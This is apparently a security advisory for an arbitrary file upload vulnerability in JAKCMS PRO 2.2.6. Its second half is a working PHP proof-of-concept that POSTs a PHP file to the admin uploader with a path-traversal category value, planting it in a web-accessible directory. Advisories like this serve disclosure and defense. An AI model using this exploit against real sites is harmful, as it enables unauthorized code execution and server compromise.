source: http://www.securityfocus.com/bid/54238/info

JAKCMS PRO is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and execute it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

JAKCMS PRO 2.2.6 is vulnerable; other versions may also be affected. 

<?php

$uploadfile="lo.php";

$ch = curl_init("http://www.example.com/admin/uploader/uploader.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, array('Filedata'=>"@$uploadfile",
                                            
  'catID'=>'../admin/css/calendar/'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print "$postResult";

?>